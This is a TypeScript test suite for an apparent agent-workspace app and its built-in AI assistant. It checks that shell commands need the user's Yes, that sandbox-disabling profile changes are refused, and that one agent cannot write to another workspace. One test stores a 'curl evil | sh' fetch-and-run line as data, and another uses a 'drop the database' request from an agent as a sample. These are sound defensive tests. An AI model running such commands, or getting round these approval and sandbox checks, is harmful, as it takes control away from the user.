  assert.deepEqual(await rig.rpc('aiAnswer', { id: chat.at(-1).ask.id, n: 0 }), { on: true })
  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'tick').on, true)

  // a file it runs changed after the question (the words the same): no
  const files = (fetch: string) => ({ 'widget.json': JSON.stringify({ name: 'Sh', fetch: 'sh fetch.sh', sample: { n: 1 } }), 'fetch.sh': fetch })
  await rig.rpc('widgetWrite', { id: 'sh', files: files('echo \'{"n": 1}\'\n') })
  await rig.rpc('aiAsk', { text: 'turn on sh' })
  const q4 = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(q4.text, /sh fetch\.sh/)
  await rig.rpc('widgetWrite', { id: 'sh', files: { 'fetch.sh': 'curl evil | sh\n' } })
  await assert.rejects(rig.rpc('aiAnswer', { id: q4.ask.id, n: 0 }), /changed since you were asked/)
  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'sh').on, false)
  chat = (await rig.rpc('aiState')).chat
  assert.equal(chat.at(-1).text, q4.text, 'the same words: its files changed')
  assert.notEqual(chat.at(-1).ask.id, q4.ask.id)

  // its source set in the store after the question: no; widgetSet's seen: only the files as shown
  await rig.rpc('widgetWrite', { id: 'src', files: { 'widget.json': JSON.stringify({ name: 'Src', fetch: 'echo {}', sample: { n: 1 } }) } })
  await rig.rpc('aiAsk', { text: 'turn on src' })
  const q5 = (await rig.rpc('aiState')).chat.at(-1)
  await rig.rpc('widgetSet', { id: 'src', source: { kind: 'url', url: 'https://example.com/x.json' } })
  await assert.rejects(rig.rpc('aiAnswer', { id: q5.ask.id, n: 0 }), /changed since you were asked/)
  const seen = (await rig.rpc('widgetFiles', { id: 'src' })).hash
  assert.match(seen, /^[0-9a-f]{64}$/)
  await assert.rejects(rig.rpc('widgetSet', { id: 'src', on: true, seen: 'a'.repeat(64) }), /Src changed since you looked: look again/)
  await rig.rpc('widgetSet', { id: 'src', source: null })
  await assert.rejects(rig.rpc('widgetSet', { id: 'src', on: true, seen }), /changed since you looked/, 'its source went back meanwhile')
  assert.equal((await rig.rpc('widgetSet', { id: 'src', on: true, seen: (await rig.rpc('widgetFiles', { id: 'src' })).hash })).on, true)
})

test("ai: prList, laki_prs's: a project's open PRs, yours or others', each with the workspace that has it", async t => {
  const rig = await fresh(t)
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const pr = (number: number, login: string) => ({ number, title: `PR ${number}`, author: { login }, url: `https://github.com/o/r/pull/${number}`, headRefName: `b${number}`, baseRefName: 'main', isDraft: false, reviewDecision: '', updatedAt: '2026-10-11T00:00:00Z' })
  mkdirSync(rig.env.FAKE_GH, { recursive: true })
  writeFileSync(join(rig.env.FAKE_GH, 'prlist.json'), JSON.stringify([pr(1, 'me'), pr(2, 'bob')]))
  const all = await rig.rpc('prList', { project: p.id })
  assert.deepEqual(all.map((x: any) => [x.number, x.author, x.mine, x.branch]), [[1, 'me', true, 'b1'], [2, 'bob', false, 'b2']])
  assert.deepEqual((await rig.rpc('prList', { project: p.id, who: 'others' })).map((x: any) => x.number), [2])
  await assert.rejects(rig.rpc('prList', { project: 'nope' }), /no project nope/)
})

test("ai: the skill's tools: templates and actions start workspaces, a shell gets a command typed, actions run, notes and renames", async t => {
  const rig = await fresh(t)
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', {
    templates: [{ name: 'careful', text: 'Be careful. {{prompt}}' }],
    actions: [{ name: 'review', target: 'claude', text: 'Review the code' }, { name: 'lint', target: 'shell', text: 'echo linted' }],
  })
  await rig.rpc('projectSet', { id: p.id, config: { templates: [{ name: 'careful', text: 'Project care: {{prompt}}' }] } })
  const [ask] = skillTools(rig.rpc)
  const tool = (name: string): ((a: object) => Promise<any>) => [...tools(rig.rpc), ...skillTools(rig.rpc)].find(x => x.name === name)!.run
  assert.equal(ask.name, 'laki_ask')
  assert.deepEqual((await tool('laki_templates')({ project: p.id })).map((x: any) => x.text), ['Project care: {{prompt}}'], "the project's replaces the global one of its name")
  assert.deepEqual((await tool('laki_actions')({ project: p.id })).map((x: any) => x.name), ['review', 'lint'])

  // a workspace from an action, through a template: the action's words, then what was asked
  const w = await tool('laki_new_workspace')({ project: p.id, action: 'review', template: 'careful', prompt: 'mind the auth', name: 'rv', local: true })
  await until(() => rig.fakeLog().some((l: any) => l.bin === 'claude' && l.args.includes('Project care: Review the code\n\nmind the auth')), 'the prompt')
  await assert.rejects(tool('laki_new_workspace')({ project: p.id, action: 'nope', prompt: 'x' }), /no agent action nope: review/)
  await assert.rejects(tool('laki_new_workspace')({ project: p.id, action: 'lint', prompt: 'x' }), /no agent action lint/, "a terminal's isn't an agent's")

  // a group: by its name (any case), first under it; laki_state names each project's groups and each workspace's
  await assert.rejects(tool('laki_new_workspace')({ project: p.id, prompt: 'x', group: 'Reviews' }), /no group Reviews in .*: it has none \(leave group out\)/)
  await rig.rpc('projectSet', { id: p.id, seps: [{ id: 'sep-rv', name: 'Reviews' }, { id: 'sep-ft', name: 'Features' }], rows: [w.id, 'sep-ft', 'sep-rv'] }) // w above both: in no group
  await assert.rejects(tool('laki_new_workspace')({ project: p.path, prompt: 'x', group: 'Bugs' }), /no group Bugs in .*: its groups are Reviews, Features/) // by its path too, as findProject
  const g = await tool('laki_new_workspace')({ project: p.id, prompt: 'review PR 7', name: 'rv7', group: 'reviews' })
  const st = await tool('laki_state')({})
  assert.deepEqual(st.projects.find((x: any) => x.id === p.id).groups, ['Reviews', 'Features'])
  assert.equal(st.workspaces.find((x: any) => x.id === g.id).group, 'Reviews')
  assert.equal(st.workspaces.find((x: any) => x.id === w.id).group, undefined)
  // a group with a prompt template: a new workspace in it starts with it, unless one is given; laki_state names it
  await rig.rpc('projectSet', { id: p.id, seps: [{ id: 'sep-rv', name: 'Reviews', template: 'careful' }, { id: 'sep-ft', name: 'Features', template: 'gone' }] })
  assert.deepEqual((await tool('laki_state')({})).projects.find((x: any) => x.id === p.id).groupTemplates, { Reviews: 'careful', Features: 'gone' })
  await tool('laki_new_workspace')({ project: p.id, prompt: 'look at PR 8', name: 'rv8', group: 'Reviews' })
  await until(() => rig.fakeLog().some((l: any) => l.bin === 'claude' && l.args.includes('Project care: look at PR 8')), "the group's template")
  await tool('laki_new_workspace')({ project: p.id, prompt: 'add a flag', name: 'ft1', group: 'Features' }) // its template gone: the prompt as it is
  await until(() => rig.fakeLog().some((l: any) => l.bin === 'claude' && l.args.includes('add a flag')), 'no template')
  // an agent's laki mcp (its $LAKI_WORKSPACE): what it starts came from there, the prompt's PRs only related
  const spun: any = await tools(rig.rpc, g.id).find(x => x.name === 'laki_new_workspace')!.run({ project: p.id, prompt: 'fix what https://github.com/o/r/pull/7 broke', name: 'fx' })
  assert.deepEqual([spun.from, spun.prUrl, spun.related], [g.id, undefined, ['https://github.com/o/r/pull/7']])
  const st2 = await tool('laki_state')({})
  assert.deepEqual([st2.workspaces.find((x: any) => x.id === spun.id).from, st2.workspaces.find((x: any) => x.id === spun.id).related], [g.id, ['https://github.com/o/r/pull/7']])

  // a shell action runs in a new shell tab; an agent's goes to the agent there
  const tabs0 = (await rig.rpc('state')).tabs.length
  await tool('laki_run_action')({ ws: w.id, name: 'lint' })
  assert.equal((await rig.rpc('state')).tabs.length, tabs0 + 1)

  // a shell with a command typed, not run (Enter is the user's)
  const sh = await tool('laki_shell')({ ws: w.id, command: 'echo typed-not-run' })
  assert.deepEqual([sh.workspace, sh.typed], [w.id, true])
  const screen = await until(() => rig.rpc('screen', { target: `${w.id}/${sh.tab}`, lines: 10 }).then((x: any) => (JSON.stringify(x).includes('echo typed-not-run') ? x : null)), 'the command typed')
  assert.doesNotMatch(JSON.stringify(screen), /\\ntyped-not-run/, 'not run')
  // a command to run goes to the user first (aiQuestion: only while Laki AI works; the ask test below); an agent's tab
  // gets it as a message
  await assert.rejects(tool('laki_shell')({ ws: w.id, command: 'echo ran', run: true }), /only while Laki AI works/)
  await assert.rejects(tool('laki_run')({ tab: sh.tab, text: 'echo ran' }), /only while Laki AI works/)
  const agentTab = (await rig.rpc('state')).tabs.find((t: any) => t.workspace === w.id && t.kind === 'agent')
  const msg = await tool('laki_run')({ tab: `${w.id}/${agentTab.id}`, text: 'look again' })
  assert.ok(msg.sent || msg.queued, 'sent, or queued until its turn ends')
  await assert.rejects(tool('laki_run')({ tab: 'nope', text: 'x' }), /no tab nope/)
  await assert.rejects(tool('laki_run')({ tab: sh.tab, text: '  ' }), /the text is empty/)
  // a shell busy with a command takes nothing (it would go to that program)
  const app = await connect(rig) // shells are scanned for a running command while the app is open
  await rig.rpc('input', { tab: sh.tab, data: '\x05\x15' })
  await rig.rpc('send', { target: sh.tab, text: 'sleep 30' })
  await until(() => rig.rpc('state').then((v: any) => v.tabs.find((t: any) => t.id === sh.tab).status === 'running'), 'the shell busy')
  await assert.rejects(tool('laki_run')({ tab: sh.tab, text: 'ls' }), /is running something/)
  app.ws.close()

  // notes: added to the end, or replaced; a workspace renamed
  await tool('laki_notes_write')({ project: p.id, text: 'one' })
  await tool('laki_notes_write')({ project: p.id, text: 'two' })
  assert.equal((await rig.rpc('state')).projects[0].notes, 'one\n\ntwo')
  await tool('laki_notes_write')({ project: p.id, text: 'only', replace: true })
  assert.equal((await rig.rpc('state')).projects[0].notes, 'only')
  await tool('laki_rename')({ ws: w.id, name: 'review auth', pinned: true })
  const ws = (await rig.rpc('state')).workspaces.find((x: any) => x.id === w.id)
  assert.deepEqual([ws.name, ws.pinned], ['review auth', true])
  await assert.rejects(tool('laki_memory_write')({ project: p.id, text: 'x', id: 'nope' }), /no memory item nope/)
})

test("Laki AI's looks: its screen and browser calls said as its own (aiRpc), the app told which tab (peek); others' not", async t => {
  const sent: [string, any][] = []
  const fake = aiRpc((async (m: string, p?: any) => void sent.push([m, p])) as Rpc)
  await fake('screen', { target: 'w' })
  await fake('browse', { ws: 'w', op: 'text' })
  await fake('state')
  assert.deepEqual(sent, [['screen', { target: 'w', by: 'ai' }], ['browse', { ws: 'w', op: 'text', by: 'ai' }], ['state', undefined]])
  const rig = await fresh(t)
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const ws = await rig.rpc('wsNew', { project: p.id, preset: 'shell', name: 'looked' })
  const sh = await rig.tab(ws.id, 'shell')
  const c = await rig.connect()
  await rig.rpc('screen', { target: sh.id, lines: 5 })
  await rig.rpc('screen', { target: sh.id, lines: 5, by: 'ai' })
  await until(() => c.events.some(e => e.ev === 'peek'), 'a peek')
  assert.deepEqual(c.events.filter(e => e.ev === 'peek').map(e => [e.ws, e.tab]), [[ws.id, sh.id]], 'only its own look')
  c.close()
})

test("ai: a command for a shell (laki_run, laki_shell's run) asks first; Laki runs it only at the user's Yes, on a cleared line", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const w = await rig.rpc('wsNew', { project: p.id, local: true, preset: 'shell' })
  const sh = (await rig.rpc('state')).tabs.find((t: any) => t.workspace === w.id && t.kind === 'shell').id
  const screen = () => rig.rpc('screen', { target: sh, lines: 20 }) as Promise<string>
  await until(async () => (await screen()).trim(), 'its prompt')

  // asked: the command shown as it will run, in the tab it goes to; No runs nothing
  or.answers.push(call('c1', 'laki_run', { tab: sh, text: 'echo ran-$((40+2))' }))
  await rig.rpc('aiAsk', { text: 'run the thing here' })
  assert.equal(or.hits.length, 1, 'the turn ends at the question')
  let q = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(q.text, /^Run this in the tab “.+” \(.+\)\?\n\n```sh\necho ran-\$\(\(40\+2\)\)\n```$/)
  assert.deepEqual(q.ask.options, ['Yes, run it', "No, don't"])
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 1 }), { kept: true })
  await sleep(500)
  assert.doesNotMatch(await screen(), /ran-42/)

  // Yes: run, on a line cleared of what the user had half typed
  or.answers.push(call('c2', 'laki_run', { tab: sh, text: 'echo ran-$((40+2))' }))
  await rig.rpc('aiAsk', { text: 'now really' })
  q = (await rig.rpc('aiState')).chat.at(-1)
  await rig.rpc('send', { target: sh, text: 'echo half', enter: false })
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 0 }), { ran: true })
  const out = (await until(async () => ((s: string) => (s.includes('\nran-42') ? s : null))(await screen()), 'run at Yes')) as string
  assert.doesNotMatch(out, /halfecho/)
  assert.match((await rig.rpc('aiState')).chat.at(-1).text, new RegExp(`^Ran it in ${q.ask.act.label}\\.\\n\\n\`\`\`\\n[\\s\\S]*ran-42[\\s\\S]*\\n\`\`\`$`), 'what it printed, in the chat (Show its work)')

  // laki_shell's run: a new shell, the same question
  or.answers.push(call('c3', 'laki_shell', { ws: w.id, command: 'echo new-$((1+1))', run: true }))
  await rig.rpc('aiAsk', { text: 'in a new tab' })
  q = (await rig.rpc('aiState')).chat.at(-1)
  assert.match(q.text, /```sh\necho new-\$\(\(1\+1\)\)\n```/)
  const tab = q.ask.act.id
  await sleep(300)
  assert.doesNotMatch(await rig.rpc('screen', { target: tab, lines: 10 }), /new-2/)
  assert.deepEqual(await rig.rpc('aiAnswer', { id: q.ask.id, n: 0 }), { ran: true })
  await until(() => rig.rpc('screen', { target: tab, lines: 10 }).then((x: string) => x.includes('\nnew-2')), 'run in the new shell')
})

test('nextPrompt: as a claude turn ends, the next message guessed from it shows on the tab until a turn starts', async t => {
  const or = await openrouter(t, [reply({ content: '"Now add a test for it"' }), reply({ content: 'NONE' })])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const ws = await rig.rpc('wsNew', { project: p.id, preset: 'claude' })
  const tab = await until(async () => {
    const x = await rig.tab(ws.id)
    return x?.resumeId && x.status === 'idle' && x
  }, 'claude up')
  const turn = async (prompt: string, answer: string) => {
    await rig.rpc('hook', { tab: tab.id, state: 'running', payload: { hook_event_name: 'UserPromptSubmit', prompt } })
    await rig.rpc('hook', { tab: tab.id, state: 'idle', payload: { hook_event_name: 'Stop', last_assistant_message: answer } })
  }
  await turn('fix the login redirect', 'Fixed it in src/auth.ts.')
  await sleep(500)
  assert.equal(or.hits.length, 0) // off unless turned on
  await rig.rpc('settingsSet', { nextPrompt: true })
  await turn('fix the login redirect', 'Fixed it in src/auth.ts.')
  assert.equal((await until(async () => (await rig.tab(ws.id)).suggest, 'a guess')), 'Now add a test for it')
  const ask = or.hits[0].body.messages.at(-1).content
  assert.match(ask, /fix the login redirect/)
  assert.match(ask, /Fixed it in src\/auth\.ts/)
  await rig.rpc('hook', { tab: tab.id, state: 'running' })
  assert.equal((await rig.tab(ws.id)).suggest, undefined) // a turn started: gone
  await turn('thanks', 'You are welcome.')
  await until(() => or.hits.length === 2, 'asked again')
  await sleep(300)
  assert.equal((await rig.tab(ws.id)).suggest, undefined) // NONE: no guess
})

test("ai: laki_profiles changes a profile at the user's Yes; its Sandbox stays (Laki AI doesn't set it), bypass with it refused", async t => {
  const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [call('c1', 'laki_profiles', { set: [{ name: 'boxed', agent: 'claude', model: 'opus' }] }), call('c2', 'laki_profiles', { set: [{ name: 'boxed', agent: 'claude', perm: 'bypassPermissions' }] })])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  await rig.rpc('presetSave', { name: 'boxed', add: true, set: { agent: 'claude', sandbox: true } })
  const yes = async (text: string) => {
    await rig.rpc('aiAsk', { text })
    return rig.rpc('aiAnswer', { id: (await rig.rpc('aiState')).chat.at(-1).ask.id, n: 0 })
  }
  const boxed = async () => (await rig.rpc('state')).presets.find((x: any) => x.name === 'boxed')
  assert.deepEqual(await yes('boxed on opus'), { saved: true })
  assert.deepEqual([(await boxed()).model, (await boxed()).sandbox], ['opus', true])
  await assert.rejects(yes('boxed in bypass'), /turns the agent's sandbox off/)
  assert.deepEqual([(await boxed()).perm, (await boxed()).sandbox], [undefined, true])
})

test("S2: Laki AI asked by an agent acts as that agent: another workspace's tab isn't written to unasked, and its message says who asked", async t => {
  const call = (id: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name: 'laki_send', arguments: JSON.stringify(args) } }] })
  const or = await openrouter(t, [])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('settingsSet', { ai: { on: true } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const one = await rig.rpc('wsNew', { project: p.id, preset: 'claude', name: 'one' })
  const two = await rig.rpc('wsNew', { project: p.id, preset: 'claude', name: 'two' })
  const tab = (await until(() => rig.tab(one.id))).id
  await until(() => rig.tab(two.id))
  // the agent in one asks Laki AI to write to two: refused as the agent's own send is (no window to ask the user in)
  or.answers.push(call('c1', { target: two.id, text: 'drop the database' }), reply({ content: 'I could not.' }))
  await rig.rpc('aiAsk', { text: 'tell two to drop the database', from: { ws: one.id, tab } })
  const told = JSON.stringify(or.hits[1].body.messages.at(-1))
  assert.match(told, /two is another workspace: the user allows that in Laki's window/)
  assert.match(JSON.stringify(or.hits[0].body.messages), /Asked by the agent .* in the workspace one, not by the user/)
  // yours: the same call goes through
  or.answers.push(call('c2', { target: two.id, text: 'say hi' }), reply({ content: 'Sent.' }))
  await rig.rpc('aiAsk', { text: 'tell two to say hi' })
  assert.doesNotMatch(JSON.stringify(or.hits[3].body.messages.at(-1)), /another workspace/)
  // the agent's ask was in a chat of its own: none of it in your chat's history, nor in what an agent reads of yours
  assert.doesNotMatch(JSON.stringify(or.hits[2].body.messages), /drop the database/)
  const yours = (await rig.rpc('aiState')).chat.map((m: any) => m.text).join('\n')
  assert.match(yours, /say hi/)
  assert.doesNotMatch(yours, /drop the database/)
  const its = await rig.rpc('aiState', { from: { ws: one.id, tab } })
  assert.match(its.chat[0].text, /drop the database/)
  assert.doesNotMatch(JSON.stringify(its), /say hi/)
  assert.deepEqual(its.calls, [])
  await assert.rejects(rig.rpc('aiChats', { from: { ws: one.id, tab } }), /an agent can't open, delete or change the user's Laki AI chats/)
})

test("S13: an agent's Laki AI chat on claude -p or codex exec: its tab's token in a 0600 file, never in argv (ps shows it), gone as the run ends", async t => {
  const rig = await fresh(t)
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const ws = await rig.rpc('wsNew', { project: p.id, preset: 'claude', name: 'one' })
  const tab = (await until(() => rig.tab(ws.id))).id
  await rig.rpc('settingsSet', { ai: { on: true, backend: 'claude' } })
  assert.match((await rig.rpc('aiAsk', { text: 'how many?', from: { ws: ws.id, tab } })).text, /1 workspaces, asked: .*how many/s)
  const run = rig.fakeLog().filter(l => l.bin === 'claude' && l.args[0] === '-p').at(-1)
  const token = run.mcp.cfg.mcpServers.laki.env.LAKI_TAB_TOKEN
  assert.match(token, /^[0-9a-f]{16,}$/, "the agent's tab's token, in the file")
  assert.equal(run.mcp.mode, 0o600)
  assert.ok(!run.args.some((a: string) => a.includes(token)), run.args.join(' '))
  assert.throws(() => statSync(run.mcp.path), 'gone with the run')

  await rig.rpc('settingsSet', { ai: { on: true, backend: 'codex' } })
  assert.match((await rig.rpc('aiAsk', { text: 'projects?', from: { ws: ws.id, tab } })).text, /1 projects/, 'laki mcp read the file')
  const cx = rig.fakeLog().filter(l => l.bin === 'codex' && l.args[0] === 'exec').at(-1)
  assert.equal(cx.tokenFile.token, token)
  assert.equal(cx.tokenFile.mode, 0o600)
  assert.ok(!cx.args.some((a: string) => a.includes(token)), cx.args.join(' '))
  assert.throws(() => statSync(cx.tokenFile.path))
})

test("A3: an Anthropic model's request marks the tools and the system prompt for its cache, another's doesn't; the cached tokens reach the call log", async t => {
  const usage = { prompt_tokens: 9000, completion_tokens: 10, cost: 0.003, prompt_tokens_details: { cached_tokens: 8000 } }
  const or = await openrouter(t, [
    reply({ content: '', tool_calls: [{ id: 'c1', type: 'function', function: { name: 'laki_state', arguments: '{}' } }] }, usage),
    reply({ content: 'Done.' }, usage),
    { ...reply({ content: 'Plain.' }), model: 'openai/gpt-5.6-sol' },
  ])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'how is it going?' }), { text: 'Done.' })
  for (const h of or.hits.slice(0, 2)) {
    const b = h.body
    assert.deepEqual(b.messages[0].content.map((p: any) => [p.type, p.cache_control]), [['text', { type: 'ephemeral' }]], 'the system prompt: one part, its breakpoint')
    assert.deepEqual(b.tools.at(-1).cache_control, { type: 'ephemeral' }, 'the last tool: its breakpoint')
    assert.equal(b.tools.filter((x: any) => x.cache_control).length, 1)
    assert.equal(JSON.stringify(b.messages.slice(1)).includes('cache_control'), false, 'none on the history')
  }
  let calls = (await rig.rpc('aiState')).calls
  assert.equal(calls.at(-1).cachedIn, 16000, 'both rounds')
  assert.equal(calls.at(-1).in, 18000)

  await rig.rpc('settingsSet', { ai: { on: true, models: { openrouter: 'openai/gpt-5.6-sol' } } })
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'and now?' }), { text: 'Plain.' })
  const b = or.hits[2].body
  assert.equal(typeof b.messages[0].content, 'string', 'caches on its own: the system prompt as it was')
  assert.equal(JSON.stringify(b).includes('cache_control'), false)
  calls = (await rig.rpc('aiState')).calls
  assert.equal('cachedIn' in calls.find((c: any) => c.ask === 'and now?'), false, 'nothing cached: no count')
})

test('A7: OpenRouter streams: its text as it comes (partial), tool calls in pieces, usage from the last chunk; the answer as a whole reply gives it; a stream that goes quiet ends', async t => {
  const M = 'anthropic/claude-sonnet-5.5'
  const delta = (d: object, more: object = {}) => ({ model: M, choices: [{ delta: d }], ...more })
  const usage = { prompt_tokens: 100, completion_tokens: 10, cost: 0.002 }
  const or = await openrouter(t, [
    { sse: [delta({ role: 'assistant', content: '', tool_calls: [{ index: 0, id: 'c1', type: 'function', function: { name: 'laki_state', arguments: '' } }] }), delta({ tool_calls: [{ index: 0, function: { arguments: '{' } }] }), delta({ tool_calls: [{ index: 0, function: { arguments: '}' } }] }), delta({}, { usage })] },
    { sse: [delta({ content: 'One project' }), delta({ content: ', no ' }), delta({ content: 'workspaces.' }), delta({}, { usage })] },
    reply({ content: 'One project, no workspaces.' }), // the same answer, whole
    { sse: [delta({ content: 'a' }), delta({ content: 'b' }), delta({ content: 'c' }), delta({ content: 'd' }), delta({}, { usage })], gap: 250 },
    { slow: true },
  ])
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url, LAKI_AI_QUIET_MS: '600' } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  const ws = await rig.connect()
  t.after(() => ws.close())
  const streamed = await rig.rpc('aiAsk', { text: 'what is going on?' })
  assert.equal(or.hits[0].body.stream, true)
  assert.deepEqual(or.hits[0].body.usage, { include: true })
  // the call's arguments, joined from their pieces, ran the tool; the assistant's message went back as it streamed
  const back = or.hits[1].body.messages
  assert.deepEqual(back.at(-2).tool_calls, [{ id: 'c1', type: 'function', function: { name: 'laki_state', arguments: '{}' } }])
  assert.equal(back.at(-1).role, 'tool')
  assert.equal(JSON.parse(back.at(-1).content).projects.length, 0)
  const parts = ws.events.filter(e => e.ev === 'ai' && e.partial !== undefined).map(e => e.partial)
  assert.ok(parts.includes('One project'), `the first piece as it came: ${JSON.stringify(parts)}`)
  assert.ok(parts.every(p => 'One project, no workspaces.'.startsWith(p)), 'each the text so far')
  assert.ok(!ws.events.some(e => e.ev === 'ai' && e.partial !== undefined && e.chat), 'a partial carries no chat')
  const whole = await rig.rpc('aiAsk', { text: 'what is going on?' })
  assert.deepEqual(streamed, whole, 'the same answer as a whole reply')
  const a = await rig.rpc('aiState')
  assert.deepEqual(a.chat.filter((m: any) => m.role === 'ai').map((m: any) => m.text), ['One project, no workspaces.', 'One project, no workspaces.'])
  assert.deepEqual([a.calls[0].in, a.calls[0].out].map(Number), [100, 10])
  assert.deepEqual([a.calls.at(-1).in, a.calls.at(-1).out], [200, 20], 'both rounds: usage from each last chunk')
  // the limit is a quiet one: a second of chunks 250 ms apart goes through; nothing for 600 ms ends it
  assert.deepEqual(await rig.rpc('aiAsk', { text: 'slowly' }), { text: 'abcd' })
  await assert.rejects(rig.rpc('aiAsk', { text: 'and?' }), /OpenRouter sent nothing for 1 s/)
})

test("A8: a long chat's history goes by size: whole turns, newest first, under the budget; the page learns where the model's view starts", async t => {
  const N = 30
  const answer = (i: number) => `${i}: ${'all good. '.repeat(500)}` // 5 KB each
  const or = await openrouter(t, Array.from({ length: N }, (_, i) => reply({ content: answer(i) })))
  const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
  await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
  for (let i = 0; i < N; i++) await rig.rpc('aiAsk', { text: `ask ${i}` })
  const body = or.hits.at(-1)!.body
  const hist = body.messages.slice(1, -1)
  const size = hist.reduce((n: number, m: any) => n + m.content.length, 0)
  assert.ok(size <= 60_000, `history ${size} chars`)
  assert.ok(hist.length >= 20, 'still a good part of it')
  assert.deepEqual(body.messages.at(-1), { role: 'user', content: `ask ${N - 1}` })
  // the newest turns whole, in order, starting with an ask
  assert.deepEqual(hist.slice(-4), [{ role: 'user', content: `ask ${N - 3}` }, { role: 'assistant', content: answer(N - 3) }, { role: 'user', content: `ask ${N - 2}` }, { role: 'assistant', content: answer(N - 2) }])
  assert.equal(hist[0].role, 'user')
  // nothing stored or shown changed; the page's mark: the first message the model still sees
  const a = await rig.rpc('aiState')
  assert.equal(a.chat.length, 2 * N)
  const first = a.chat.find((m: any) => m.at === a.seenFrom)
  assert.equal(first?.role, 'user')
  assert.ok(Number(first.text.split(' ')[1]) > 0, 'older ones left out')
  // a short chat: all of it, no mark
  await rig.rpc('aiNew')
  assert.equal((await rig.rpc('aiState')).seenFrom, undefined)
})
